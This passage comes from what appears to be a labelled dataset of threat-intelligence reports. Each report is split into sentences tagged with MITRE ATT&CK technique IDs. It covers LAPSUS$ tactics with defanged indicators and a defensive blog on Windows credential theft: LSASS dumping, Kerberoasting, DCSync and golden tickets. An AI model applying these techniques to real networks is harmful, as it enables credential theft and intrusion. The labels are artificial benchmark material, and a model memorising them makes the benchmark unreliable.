                "T1027"
            ],
            [
                "T1055"
            ],
            [
                "T1027",
                "T1055",
                "T1140"
            ],
            [],
            [],
            [],
            [
                "T1106"
            ],
            [
                "T1140"
            ],
            [],
            [
                "T1140"
            ],
            [
                "T1027"
            ],
            [],
            [
                "T1055"
            ],
            [],
            [],
            [
                "T1547.001"
            ],
            [],
            [],
            [],
            [
                "T1027",
                "T1105",
                "T1070.004"
            ],
            [],
            [
                "T1041",
                "T1105",
                "T1113",
                "T1056.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1056.001"
            ],
            [],
            [
                "T1105",
                "T1113",
                "T1056.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1090"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1566.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1059.003"
            ],
            [
                "T1106"
            ],
            [],
            [
                "T1204.002"
            ],
            [
                "T1547.001"
            ],
            [
                "T1053.005"
            ],
            [
                "T1548.002"
            ],
            [
                "T1140"
            ],
            [
                "T1562.001"
            ],
            [],
            [
                "T1070.004"
            ],
            [
                "T1112"
            ],
            [],
            [
                "T1027"
            ],
            [],
            [
                "T1027"
            ],
            [
                "T1055"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1083"
            ],
            [],
            [],
            [],
            [
                "T1057"
            ],
            [
                "T1012"
            ],
            [],
            [],
            [
                "T1518.001"
            ],
            [],
            [
                "T1016",
                "T1082"
            ],
            [],
            [],
            [
                "T1033"
            ],
            [],
            [],
            [
                "T1021.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1005"
            ],
            [],
            [
                "T1056.001"
            ],
            [],
            [
                "T1113"
            ],
            [],
            [],
            [],
            [
                "T1573.001"
            ],
            [
                "T1095"
            ],
            [],
            [],
            [
                "T1041"
            ]
        ]
    },
    {
        "doc_title": "LAPSUS Recent techniques tactics and procedures",
        "cti_report": [
            "title: LAPSUS$: Recent techniques, tactics and procedures url: https://research.nccgroup.com/2022/04/28/lapsus-recent-techniques-tactics-and-procedures/ Authored by: David Brown, Michael Matthews and Rob Smallridge tl;dr This post describes the techniques, tactics and procedures we observed during recent LAPSUS$ incidents. ",
            "Our findings can be summarised as below: Access and scraping of corporate Microsoft SharePoint sites in order to identify any credentials which may be stored in technical documentation.",
            "Access to local password managers and databases to obtain further credentials and escalate privileges.",
            "Living of the land \u2013 tools such as RVTools to shut down servers and ADExplorer to perform reconnaissance.",
            "Cloning of git repositories and extraction of sensitive API Keys.",
            "Using compromised credentials to access corporate VPNs.",
            "Disruption or destruction to victim infrastructure to hinder analysis and consume defensive resource. ",
            "Summary LAPSUS$ first appeared publicly in December 2021, however, NCC Group first observed LAPSUS$ months prior during an incident response engagement.",
            "We believe the group has also operated prior to this date, though perhaps not under the \u201cLAPSUS$\u201d banner. ",
            "Over the last 5 months, LAPSUS$ has gained large notoriety with some successful breaches of some large enterprises including, Microsoft, Nvidia, Okta & Samsung.",
            "Little is still known about this group with motivations appearing to be for reputation, money and \u201cfor the lulz\u201d. ",
            "Notifications or responsibility of victims by LAPSUS$ are commonly reported via their telegram channel and in one case a victim\u2019s DNS records were reconfigured to LAPSUS$ controlled domains/websites.",
            "However, not all victims or breaches appear to actively be announced via their telegram channel, nor are some victims approached with a ransom.",
            "This distinguishes themselves from more traditional ransomware groups who have a clear modus operandi and are clearly financially focused.",
            "The result of this is that LAPSUS$ are less predictable which may be why they have seen recent success. ",
            "This serves as a reminder for defenders for defence in depth and the need to anticipate different tactics that threat actors may use. ",
            "It is also worth mentioning the brazen behaviour of this threat actor and their emboldened attempts at Social Engineering by offering payment for insiders to provide valid credentials. ",
            "This tactic is potentially in response to greater home working due to the pandemic which means there is a far larger proportion of employees with VPN access and as such a greater pool of potential employees willing to sell their credentials. ",
            "To combat this, organisations need to ensure they have extensive VPN logging capabilities, robust helpdesk ticketing as well as methods to help identify anomalies in VPN access. ",
            "It is notable that the majority of LAPSUS$ actions exploit the human element as opposed to technical deficiencies or vulnerabilities.",
            "Although potentially viewed as unsophisticated or basic these techniques have been successful, so it is vital that organisations factor in controls and mitigations to address them. ",
            "Initial access Threat Intelligence shows that LAPSUS$ utilise multiple methods to gain Initial access. ",
            "The main source of initial access is believed to occur via stolen authentication cookies which would grant the attacker access to a specific application.",
            "These cookies are usually in the form of Single sign-on (SSO) applications which would allow the attacker to pivot into other corporate applications ultimately bypassing controls such as multi-factor authentication (MFA). ",
            "Credential access and Privilege escalation Credential Harvesting and privileged escalation are key components of the LAPSUS$ breaches we have seen, with rapid escalation in privileges the LAPSUS$ group have been seen to elevate from a standard user account to an administrative user within a couple of days. ",
            "In the investigations conducted by NCC Group, little to no malware is used.",
            "In one case NCC Group observed LAPSUS$ using nothing more than the legitimate Sysinternals tool ADExplorer, which was used to conduct reconnaissance on the victim\u2019s environment. ",
            "Access to corporate VPNs is a primary focus for this group as it allows the threat actor to directly access key infrastructure which they require to complete their objectives. ",
            "In our incident response cases, we saw the threat actor leveraging compromised employee email accounts to email helpdesk systems requesting access credentials or support to get access to the corporate VPN. ",
            "Lateral Movement In one incident LAPSUS$ were observed to sporadically move through the victim environment via RDP in an attempt to access resources deeper in the victim environment.",
            "In some instances, victim controlled hostnames were revealed including the host \u201cVULTR-GUEST\u201d which refers to infrastructure hosted on the private cloud service, Vultr[3]. ",
            "Exfiltration LAPSUS$\u2019s action on objectives appears to focus on data exfiltration of sensitive information as well as destruction or disruption.",
            "In one particular incident the threat actor is observed to utilise the free file drop service \u201cfiletransfer[.]io\u201d. ",
            "Impact NCC Group has observed disruption and destruction to client environments by LAPSUS$ such as shutting down virtual machines from within on-premises VMware ESXi infrastructure, to the extreme of mass deletion of virtual machines, storage, and configurations in cloud environments making it harder for the victim to recover and for the investigation team to conduct their analysis activities. ",
            "The theft of data reported appears to heavily be focused on application source code or proprietary technical information.",
            "With a targeting of internal source code management or repository servers.",
            "These git repositories can contain not only commercially sensitive intellectual property, but also in some cases may include additional API keys to sensitive applications including administrative or cloud applications. ",
            "Recommendations Ensure that Cloud computing environments have sufficient logging enabled.",
            "Ensure that cloud administrative access is configured to prevent unauthorised access to resources and that API keys are not overly permissive to the permissions they require.",
            "Utilise MFA for user authentication on both cloud and remote access solutions to help reduce the risk of unauthorised access.",
            "Ensure logging is in place to record MFA device enrolmentSecurity controls such as Conditional Access can help restrict or prevent unauthorised access based on criteria such as geographical location.",
            "Implement activities to detect and investigate anomalies in VPN access.",
            "Ensure a system is in place to record all helpdesk queries.",
            "Avoid using SMS as an MFA vector to avoid the risk of SIM swapping.",
            "Securing source code environments to ensure that users can only access the relevant repositories.",
            "Secret Scanning[1][2] on source code repositories should be conducted to ensure that sensitive API credentials are not stored in source code.",
            "GitHub and Gitlab offer detection mechanisms for thisRemote Desktop services or Gateways used as a primary or secondary remote access solution should be removed from any corporate environment in favour for alternative solutions such as secured VPNs, or other Remote Desktop applications which mitigate common attack techniques such as brute force or exploitation and can offer additional security controls such as MFA and Conditional Access.",
            "Centralise logging including cloud applications (SIEM solution).Offline or immutable backups of servers should be taken to ensure that in the event of a data disruption or destruction attack, services can be restored.",
            "Reduce MFA token/Session cookie validity timesEnsure principle of least privilege for user accounts is being adhered to.",
            "Social engineering awareness training for all staff. ",
            "Indicators of Compromise Indicator ValueIndicator TypeDescription104.238.222[.]158IP",
            "addressMalicious Lapsus Network Address108.61.173[.]214IP",
            "addressMalicious Lapsus Network Address185.169.255[.]74IP addressMalicious Lapsus Network AddressVULTR-GUESTHostnameThreat Actor Controlled Hosthxxps://filetransfer[.]ioDomainFree",
            "File Drop Service Utilised by the Threat Actor MITRE ATT&CK Technique CodeTechniqueT1482Discovery \u2013 Domain Trust DiscoveryT1018Discovery \u2013 Remote System DiscoveryT1069.002Discovery \u2013",
            "Groups Discovery: Domain GroupsT1016.001Discovery \u2013 System Network Configuration DiscoveryT1078.002Privilege Escalation \u2013 Domain AccountsT1555.005Credential Access \u2013 Credentials from Password Stores: Password ManagersT1021.001Lateral Movement \u2013 Remote Services:",
            "Remote Desktop ProtocolT1534Lateral Movement \u2013 Internal SpearphishingT1072Execution \u2013 Software Deployment ToolsT1213.002Collection \u2013 Data from Information Repositories: SharepointT1039Collection \u2013 Data from Network Shared DriveT1213.003Collection \u2013 Data from Information Repositories: Code RepositoriesT1567Exfiltration \u2013 Exfiltration Over Web ServiceT1485Impact \u2013 Data DestructionT1529Impact \u2013 System Shutdown/Reboot References https://docs.github.com/en/code-security/secret-scanning/about-secret-scanninghttps://docs.gitlab.com/ee/user/application_security/secret_detectionhttps://www.vultr.com/ "
        ],
        "label": [
            [],
            [
                "T1552.001"
            ],
            [
                "T1552.001"
            ],
            [],
            [
                "T1552.001",
                "T1078"
            ],
            [
                "T1078"
            ],
            [
                "T1078"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1021.001"
            ],
            [
                "T1082"
            ],
            [
                "T1005"
            ],
            [],
            [
                "T1070.004"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Detecting Credential Stealing Attacks Through Active InNetwork Defense",
        "cti_report": [
            "title: Detecting Credential Stealing Attacks Through Active In-Network Defense url: https://www.mcafee.com/blogs/enterprise/mcafee-enterprise-atr/detecting-credential-stealing-attacks-through-active-in-network-defense/ Executive Summary Today, enterprises tend to use multiple layers of security defenses, ranging from perimeter defense on network entry points to host based security solutions deployed at the end user\u2019s machines to counter the ever-increasing threats.",
            "This includes inline traffic filtering and management security solutions deployed at access and distribution layers in the network, as well as out of band solutions like NAC, SIEM or User Behavior Analysis to provide identity-based network access and gain more visibility into the user\u2019s access to critical network resources.",
            "However, layered security defenses face the major and recurring challenge of detecting newer exploitation techniques as they heavily rely on known behaviors.",
            "Additionally, yet another significant challenge facing the enterprise network is detecting post-exploitation activities, after perimeter security is compromised. ",
            "Post initial compromise, to be able to execute meaningful attacks, attackers would need to steal credentials to move laterally inside the network, access critical network assets and eventually exfiltrate data.",
            "They will use several sophisticated techniques to perform internal reconnaissance and remote code execution on critical resources, which range from using legitimate operating system tools to discover network assets to using novel code execution techniques on the target.",
            "Consequently, differentiating between the legitimate and malicious use of Windows\u2019 internal tools and services becomes a high priority for enterprise networks. ",
            "To tackle this long-standing problem of detecting lateral movement, enterprise networks must formulate active in-network defense strategies to effectively prevent attackers from accessing critical network resources.",
            "Network Deception is one such defensive approach which could potentially prove to be an effective solution to detect credential theft attacks.",
            "Detecting credential stealing attacks with deception essentially requires building the necessary infrastructure by placing the decoy systems within the same network as production assets and configuring them with decoy contents to lure the attackers towards the decoy machines and services.",
            "Accurately configuring and tuning the deceptive network can deflect the attacker\u2019s lateral movement path towards the deceptive services, consequently allowing the attackers to engage with the deceptive network, helping enterprises protect production assets. ",
            "MITRE Shield, a knowledge base maintained by MITRE for active defense techniques highlights many of the methods in adversary engagement.",
            "Some of the techniques described by MITRE Shield Matrix with respect to network deception are as below: MITRE Shield Description ATT&CK Technique Decoy Account \u2013 DTE0010 A decoy account is created for defensive or deceptive purposes.",
            "The decoy account can be used to make a system, service, or software look more realistic or to entice an action Account Discovery, Reconnaissance Decoy Credentials \u2013 DTE0012 Seed a target system with credentials (such as username/password, browser tokens, and other forms of authentication data) Credential Access, Privilege Escalation Decoy Diversity \u2013 DTE0013 deployment of decoy systems with varying Operating Systems and software configurations Reconnaissance Decoy Network \u2013 DTE0014 Multiple computing resources that can be used for defensive or deceptive purposes Initial Access Decoy Personna \u2013 DTE0015 Used to establish background information about a user.",
            "In order to have the adversary believe they are operating against real targets Initial Access, Discovery, Reconnaissance Decoy System \u2013 DTE0017 Computing resources presented to the adversary in support of active defense Reconnaissance Over the course of this paper, we will discuss some of the widely adapted credential theft attacks executed by adversaries after the initial compromise and then move on to discuss defense techniques against the above MITRE Shield attacks and how to use them effectively to detect deceptive credential usage in the network. ",
            "Network Deception \u2013 An Active in-network defensive approach Most of the targeted attacks involve stealing credentials from the system at a certain point in time as attackers would use them to pivot to other systems in the network.",
            "Some of the credential stealing techniques like Golden Ticket attacks have been found to be used in multiple ransomwares armed with lateral movement capabilities. ",
            "Active in-network defense strategies described by the MITRE Shield matrix are significant and play a critical role in detecting credential abuse in the network. ",
            "Network Deception uses these active defense techniques to build the deceptive network infrastructure which could potentially lead to redirecting an attacker\u2019s lateral movement path and engaging them to the decoy services without touching the critical production systems. ",
            "It involves placing decoy systems, decoy credentials and decoy contents all throughout the production network essentially converting it into a trap, playing a crucial role in mitigating the attacks. ",
            "McAfee Protection McAfee MVISION Endpoint Security has the capabilities to protect against credential theft attacks like credential extraction from LSASS process memory via ATP rule 511.",
            "More details on configuring policies and a demo are available here. ",
            "McAfee MVISION Endpoint Detection and Response (EDR) has the capabilities to detect credential access from tools like Mimikatz. ",
            "With McAfee MVISION EDR and ENS integration with Attivo\u2019s network and endpoint deception sensor, McAfee can manage its agents and receive alerts for detections in ePO and EDR. ",
            "Lateral Movement \u2013 Introduction Lateral movement refers to the tools and techniques used by attackers to progressively expand their foothold within an enterprise network after gaining initial access.",
            "As shown in the figure below, lateral movement activity comprises of several stages starting from credential theft, target enumeration and discovery, privilege escalation, gaining access to network resources and eventually remote code execution on the target before exfiltrating data to accomplish a successful attack.",
            "Once inside the network, attackers will deploy a range of techniques at each stage of lateral movement to achieve their end goal.",
            "One of the primary challenges an attacker will face while moving laterally inside a network is to hide their activities in plain sight by generating a minimum volume of legitimate looking logs to be able to remain undetected.",
            "To achieve this, an attacker might choose to embed the tool within a malicious executable or use the operating system\u2019s internal legitimate tools and services to perform its lateral movement operations, consequently making this network traffic harder to distinguish. ",
            "As per the Verizon DBIR report 2020, over 80% of data breaches involve credential theft attacks.",
            "Credential theft is one of the primary tasks attackers need to perform post-exploitation and after gaining initial control of the target machine.",
            "It will usually be the first step towards lateral movement strategies which will allow attackers to elevate their privileges and acquire access to other network resources.",
            "As indicated earlier, attackers have long been abusing Windows legitimate features like SMB, RPC over SMB, Windows Management Instrumentation, Windows Remote Management, and many other features to perform lateral movement activities.",
            "Figure 1 below highlights where lateral movement falls within the attack chain and its different stages.",
            "To remain stealthier, these activities would span a period ranging from many weeks to months. ",
            "Figure 1 \u2013 Stages of Lateral movement To be able to distinguish between the admissible and malicious use of these inbuilt services, it is extremely critical for organizations to deploy advanced Threat Detection solutions.",
            "Over the course of this blog, we will discuss various credential theft techniques used by adversaries during lateral movement.",
            "We will also discuss an approach that can be used to effectively detect these techniques inside the network. ",
            "Credential Theft Attacks Attackers use a variety of tools and techniques to execute credential theft attacks.",
            "Many of these tools are open source and readily available on the internet.",
            "Operating systems like Windows implement Single Sign",
            "On (SSO) functionality, which require the user\u2019s credentials to be stored in memory, thereby allowing the OS to seamlessly access network resource without repeatedly asking the user to re-enter those credentials.",
            "Additionally, user credentials are stored in memory in a variety of formats like NTLM hashes, reversibly encrypted plaintext, Kerberos tickets, PINs, etc., which can be used to authenticate to services depending upon the supported authentication mechanism.",
            "These credentials can be acquired by attackers from memory by parsing appropriate credential storage structures or using the Windows credential enumeration APIs. ",
            "Consequently, these attacks pose major security concerns, especially in the domain environment if the attacker gains access to privileged credentials which can then be reused to access critical network resources.",
            "In the following sections, we discuss some of the widely adapted credential stealing techniques used by malware, with respect to the Windows operating system.",
            "Similar credential stealing techniques can also be used with other operating systems as well. ",
            "Stealing Credentials from LSASS Process Memory The Local Security Authority Subsystem Service (LSASS) process manages and stores the credentials of all the users with active Windows sessions.",
            "These credentials stored in the LSASS process memory will allow users to access other network resource such as files shares, email servers and other remote services without asking them for the credentials again.",
            "LSASS process memory stores the credentials in many formats including reversibly encrypted plaintext, NTLM hashes, Kerberos Tickets (Ticket Granting Tickets, etc.).",
            "These credentials are generated and stored in the memory of the LSASS process when a user initiates the interactive logon to the machine such as console logon or RDP, runs a scheduled task or uses remote administration tools.",
            "The encryption and decryption of credentials is done using LsaProtectMemory and LsaUnProtectMemory respectively and hence a decryption tool using these APIs will be able to decrypt LSASS memory buffers and extract them.",
            "However, malware would need to execute with local administrator privileges and enable \u201cSeDebugPrivilege\u201d on the current process to be able access the LSASS process memory. ",
            "Below is a code snapshot from one of the famous credential harvesting tools, Mimikatz, enabling the required privileges on the calling thread before dumping the credentials. ",
            "Figure 2 \u2013 Checking for required privileges We can see that the NTLM hash of the user\u2019s credentials is revealed, and this can be brute forced offline as shown below.",
            "Many Windows services, such as SMB, support NTLM authentication and NTLM hashes can be used directly for authentication eliminating the need for the clear text passwords. ",
            "Figure 3 \u2013 Cracking NTLM Hashes offline Attackers avoid using freely available tools like Mimikatz directly on the target machine to harvest credentials since they are easily detected by AVs.",
            "Instead, they use recompiled clones of it with minimal functionality to avoid noise.",
            "Below is one such instance where malware embeds recompiled Mimikatz code with the minimal required functionality. ",
            "Figure 4 \u2013 Credential extraction tool embedded inside malicious executable Detection can also be avoided by using several \u201cliving off the land\u2019 mechanisms, available in many post-exploitation frameworks, to execute the credential harvesting tools directly from memory using Reflective PE injection, where the binary is never written to the disk.",
            "Yet another approach is to dump the LSASS process memory using process dumping tools, exfiltrate the dump and extract the credentials offline.",
            "Microsoft has documented multiple ways to configure additional LSASS process protection which can prevent credentials being compromised. ",
            "Stealing Credentials from Security Accounts Manager (SAM) Database The SAM database is a file on a local hard drive that stores the credentials for all local accounts on the Windows computer.",
            "NT hashes for all the accounts on the local machine, including the local administrator credential hash, are stored in the SAM database.",
            "The SAM database file is in %SystemRoot%system32/config and the hashes of the credentials are within the registry HKLM\\SAM.",
            "Attackers need to acquire elevated privileges to be able to access the credentials from the SAM database.",
            "The example below demonstrates how the credentials from the SAM database can be revealed through a simple Meterpreter session. ",
            "Figure 5 \u2013 Dumping SAM database Stealing Credentials from Windows Credential Manager (CredMan) Windows Credential Manager stores the Web and SMB/RDP credentials of users if they choose to save them on the Windows machine, thereby preventing the authentication mechanism from asking for those passwords again on subsequent logins.",
            "These credentials are encrypted with Windows Data Protection APIs (DPAPI) CryptProtectData, either using the current user\u2019s logon session or a generated master key, and then saved on the local hard drive.",
            "Consequently, any process running in the context of the logged in user will be able to decrypt the credentials using CryptUnProtectData DPAPI.",
            "In the domain environment, these credentials can be used by attackers to pivot to other systems in the network.",
            "Data Protection APIs provide the cryptographic functionalities that can be used to securely store credentials and keys.",
            "These APIs are used by several other Windows components like browsers (IE/Chrome), certificates and many other applications as well.",
            "Below is one example of how credential dumping tools like Mimikatz can be used to dump stored Chrome credentials. ",
            "Figure 6 \u2013 Dumping browser credentials DPAPI can be abused in multiple ways.",
            "In the Active Directory domain joined environment, if other users have logged into the compromised machine, provided a malware is running with escalated privileges, it can extract other user\u2019s master keys from the LSASS memory which can then be used to decrypt their secrets.",
            "Below is a screenshot of how the master key can be extracted by using the credential dumping tool. ",
            "Figure 7 \u2013 Extracting DPAPI Master Key Malware also tends to use multiple variants of credential enumeration APIs available within Windows.",
            "These APIs can extract credentials from Windows Credential Manager.",
            "Below is one instance of the malware using CredEnumerateW API to retrieve credentials and then search for terminal services passwords which It would use to pivot to other systems. ",
            "Figure 8 \u2013 Extracting credentials using Windows API Stealing Service Account Credentials Through Kerberoasting In the domain joined environment, the Kerberos protocol has a significant role to play with respect to authentication and requesting access to services and applications.",
            "It provides Single-Sign-On functionality for accessing multiple shared resources within the enterprise network.",
            "The Kerberos authentication mechanism in Active Directory involves multiple requests and responses like Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS) supported by a Key Distribution Server (KDC), usually a Domain Controller.",
            "Upon successful authentication, a user will be able to access the respective services. ",
            "Attackers gaining access to a system joined in the domain would usually look for high value assets like Active Directory Controller, Database server, SharePoint server, Web Server, etc., and these services are registered in the domain with the specific Service Principal Name (SPN) values, which is a unique identifier of the Service Account in the domain.",
            "These SPN values are used by Kerberos to map the instance with the logon account allowing the client to authenticate to the respective service.",
            "Well known SPN values are listed out here.",
            "Once the attacker is authenticated with any domain user credentials and has information about the SPN values of the services within the domain, they can initiate the Kerberos Ticket Granting Service request (TGS \u2013 REQ) to the Key Distribution Server with the specified SPN value.",
            "Details on how the SPN values are registered and used in Kerberos authentication is documented here.",
            "TGS response from the KDC will have the Kerberos Ticket encrypted with the hash of the service account.",
            "This ticket can be extracted from the memory and can be brute forced offline to acquire service account credentials, allowing a domain user to gain admin level access to the service. ",
            "Kerberoasting is a well-documented attack technique listed in MITRE ATT&CK and it essentially abuses the Kerberos authentication allowing adversaries to request the TGS Tickets for the valid service accounts and brute force the ticket offline to extract the plain text credentials of the service accounts, consequently enabling them to elevate their privileges from domain user to domain admin.",
            "As an initial step to this lateral movement technique, the attacker would perform an internal reconnaissance to gain information about the services registered in the domain and get SPN values.",
            "A simple PowerShell command after importing the Active Directory PowerShell module, as shown below, can initiate the LDAP query to get information about all the user accounts from the Domain Controller with the SPN value set. Figure 9 \u2013 PowerShell command to generate LDAP query Attackers can specifically choose to scan the domain for MSSQL service with the registered SPN value used for Kerberos authentication.",
            "PowerShell scripts like GetUserSPNs can scan all the user SPNs in the domain or MSSQL service registered in the domain with Discover-PSMSSQLServers or Invoke-Kerberoast scripts. ",
            "Following is an example output from the script: ",
            "Figure 10 \u2013 Kerberoasting PowerShell script output Once an attacker has the SPN value of the SQL service, a Kerberos Ticket Granting Service Ticket request (TGS-REQ) can be initiated to the domain controller with the SPN value.",
            "This can be done by a couple of PowerShell commands generating KRB-TGS-REQ as shown below: Figure 11 \u2013 Kerberos TGS request Consequently, the Domain Controller sends the TGS-RESP with the ticket of the service account which will be cached in the memory and can be extracted by dumping tools like Mimikatz as a .kirbi document.",
            "This can be brute forced offline by tgsrespcrack, allowing the attacker to gain unrestricted access to the service with elevated privileges. ",
            "Stealing Credentials from Active Directory Domain Service (ntdis.dit) File As indicted earlier, once an attacker has penetrated the domain network, it will be natural to progress towards targeting critical assets, such as the Active Directory controller.",
            "The Active Directory Database Services AD DS Ntds.dit file is one of the most overlooked attack vectors in the domain environment but can have significant impact if the attacker is able to gain the domain administrative rights leading to complete domain compromise. ",
            "The Ntds.dit file is the authoritative store of credentials for all the users in the domain joined environment, storing all the information about the users, groups and memberships, including credentials (NT Hashes) of all the users in the domain with historical passwords and user\u2019s DPAPI backup master keys.",
            "An Attacker with domain admin rights can gain access to the Domain Controller\u2019s file system and acquire credentials like hashes, Kerberos tickets and other reversibly encrypted passwords of all the users joined in the domain by dumping and exfiltrating the Ntds.dit file.",
            "These credentials can then be used by the attacker to further access resources by using attack techniques like PTH within the network since the credentials used across other shared resource could be same. ",
            "Multiple techniques can be used to dump the Ntds.dit file from the Domain Controller locally as well as remotely and extract the NTLM hashes/DPAPI backup keys for all the domain joined users.",
            "One of the techniques is to use the Volume Shadow Copy Service using the vssadmin command line utility and then extract the Ntds.dit file from the volume shadow copy as shown below. ",
            "Figure 12 \u2013 Dumping Volume shadow copy for C drive Sensitive data on Active Directory is encrypted with the Boot Key (Syskey) stored in the SYSTEM registry hive and dumping the SYSTEM registry hive is a prerequisite as well to be able to extract all the credentials. ",
            "Publicly available Active Directory auditing frameworks like DSInternals provide PowerShell cmdlets to extract the Syskey from the SYSTEM registry hive and extract all the credentials from the Ntds.dit file. ",
            "Ntds.dit can also give access to the powerful service account within the Active Directory Domain, KRBTGT (Key Distribution Centre Service account).",
            "Acquiring the NTLM hash of this account can enable the attacker to execute a Golden Ticket attack leading to complete domain compromise with unrestricted access to any service on the domain joined system. ",
            "Stealing Credentials Through a DCSync Attack \u2013 From Domain user to Domain Admin A DCSync attack is a method of credential acquisition which allows an attacker to impersonate the Domain Controller and can consequently replicate all the Active Directory objects to the impersonating client remotely, without requiring the user to logon to the DC or dumping the Ntds.dit file.",
            "By impersonating the Domain Controller, the attacker could acquire the NTLM hash of the KRBTGT service account, enabling them to gain access to all the shared resources and applications in the domain joined environment.",
            "To be able to execute this credential stealing technique, an attacker would have to compromise the user account with the required permissions, specifically DS-Replication-Get-Changes and DS-Replication-Get-Changes-All, as shown below. ",
            "Figure 13 \u2013 User with privileges Once the attacker compromises the user account with the required privileges, Pass-The-Hash attacks can be executed to spawn a command shell with the forged logon session.",
            "Credential dumping tools like Mimikatz do this by enumerating all the user logon sessions and replacing the user credentials with the stolen usernames and NTLM hashes provided, in the current logon session.",
            "Behind the scenes, this is executed by duplicating the current process\u2019s access token, replacing the user credentials pointed by duplicated access token and subsequently using the modified access token to start a new process with the stolen credentials which will be used for network authentication.",
            "This is as shown below for example user \u201cDCPrivUser\u201d. ",
            "Figure 14 \u2013 Pass-the-Hash attack Further, as indicated below, any subsequent NTLM authentication from the logon session will use the stolen credentials to authenticate to domain joined systems like the Active Directory Controller. ",
            "Attackers can now initiate the AD user objects Replication request to the Domain Controller using Directory Replication Services Remote Protocol (DRSUAPI).",
            "DRSUAPI is the RPC protocol used for replication of AD objects.",
            "With DCERPC bind request to DRSUAPI, an RPC call to DSGetNCChanges will replicate all the user AD objects to the impersonating client.",
            "Attackers would usually target the KRBTGT account since acquiring the NTLM hash of this account will enable them to execute a Golden Ticket attack resulting in unrestricted access to domain services and applications. ",
            "Figure 15 \u2013 DCSync Attack As indicated earlier, with the NTLM hash of the KRBTGT account, adversaries can initiate a Golden Ticket attack (Pass-the-Ticket) by injecting the forged Kerberos tickets into the current session which can be used to authenticate to any service with the client that supports pass the ticket (for instance, sqlcmd.exe connection to DB server, PsExec, etc.) ",
            "Figure 16 \u2013 Golden ticket with forged Kerberos ticket Detecting Credential Stealing Attacks with Network Deception ",
            "The credential theft techniques we discussed in the previous sections are just the tip of the iceberg.",
            "Adversaries can use many other sophisticated credential stealing techniques to take advantage of system misconfigurations and legitimate administrative tools and protocols and, at the same time, remain undetected for a longer period.",
            "With many other event management solutions with SIEMs, used in conjunction with other network security solutions, it becomes a challenge for administrators to distinguish malicious use of legitimate tools and services from lateral movement.",
            "Perimeter solutions have their limitations in terms of visibility once the attacker crosses the network boundary and is inside the domain environment.",
            "It is extremely critical for organizations to protect and monitor critical network assets like the Domain Controller, Database server, Exchange Servers, build systems and other applications or services, as compromising these systems will result in significant damages.",
            "Therefore, enterprise networks must deploy a solution to detect credential stealing attacks as they can be used to pivot to other systems on the network and move laterally once an attacker establishes an attack path to a high value target.",
            "If the deployment of a solution within the critical zones of the network can detect the use of stolen credentials before adversaries can reach their target, the critical assets could still be prevented from being compromised. ",
            "Network Deception is one such deployment within the domain environment where, using the MITRE Shield techniques like decoy systems and network, decoy credentials, decoy accounts, decoy contents, could potentially help detect lateral movement early in the adversary\u2019s attack path to the target asset and at the same time, report significantly low false detection rates.",
            "The idea of deception originates from the decades old honeypot systems but, unlike those, relies more on forging trust and giving adversaries what they are looking for.",
            "With its inbuilt proactiveness it is configured to lure attackers towards deceptive systems.",
            "As shown in the figure below, Network Deception consists of authentic looking decoy systems placed within the domain network, specifically in the network where the critical assets are placed.",
            "These decoy systems (could be virtual machines) are the full-fledged OS with configured applications or services and could be replicating the crucial services like Domain Controller, Exchange or DB server and other decoy machines that could lead to those systems.",
            "The image below highlights the key foundational aspects of the Network Deception Figure 17 \u2013 Network Deception Key Aspects of Network Deception As visualized in the figure above, Network Deception comprises the following key basic facts with respect to the deployment in the domain joined environment: As a part of deployment, decoy/deceptive machines are planted within the network alongside production systems and critical assets.",
            "These decoy systems could be real systems or virtual systems with production grade operating systems with the required setup to make them blend well with real systems. ",
            "As one of the key aspects, deceptive machines are configured to lure attackers towards the decoy services instead of the production services, thereby deflecting or misleading the attacker\u2019s lateral movement path to the target asset. ",
            "Many of the decoy machines could replicate critical services like Domain Controller, DB servers, Exchange/SharePoint servers and other critical services or applications within the data center. ",
            "Any legitimate domain user should not be generating traffic to or communicating with the configured decoy machines unless there are some misconfigurations in the network, which need to be corrected. ",
            "Basic Decoy Network Setup Since credential theft plays an important role in a successful targeted attack, deception essentially focuses on planting fake credentials on the production and decoy endpoints at multiple places within the OS and monitoring the use of these credentials to pivot to other systems.",
            "With respect to the network setup, the following are the key aspects, however this list is not exhaustive, and much more could be added: Replicating critical network assets and services with decoy machines: Replicating critical network services like Active Directory, DB services, etc., will make more sense since these are the most targeted systems in the network.",
            "The decoy Active Directory should be configured with deceptive AD objects (users, groups, SPNs, etc.).",
            "with deceptive contents for other replicated services. ",
            "Planting authentic looking decoy machines in the production network: As indicated earlier, these decoy machines could be real or virtual machines with the production grade OS placed alongside production systems in the critical infrastructure to blend in well.",
            "These decoy machines should be joined to the decoy AD and configured with deceptive user accounts to monitor successful logon attempts to the systems. ",
            "Injecting deceptive credentials on production endpoints: Production endpoints should be injected with deceptive credentials at multiple places like LSASS process memory, Credential Manager, browser credentials, etc., to increase the possibility of these credentials being picked up and used to pivot to decoy systems in the network.",
            "These endpoints could be public facing machines or their replicas as well. ",
            "Decoy Machine runs client applications pointing to decoy services: Decoy machines may run the client with deceptive credentials and configured to point to the decoy services.",
            "These could be DB/FTP/Email clients and any other replicated decoy services. ",
            "Mark decoy systems as \u201cNO LANDING ZONE\u201d: One of the key deployment aspects of deception is to mark all the decoy systems and services as \u201cNO LANDING ZONE\u201d, essentially meaning no legitimate domain users should be accessing decoys and any attempts to access these systems should be closely monitored. ",
            "Some of the other setup required for effective deployment of deception is as summarized below: Figure 18 \u2013 Deceptive network setup \u2013 Basic requirements Basic Decoy Systems Setup To detect the use of deceptive credentials, setting up decoy machines is an essential part of the solution as well.",
            "Primarily, decoy machines should enable the access attackers are looking to have during the lateral movement phase.",
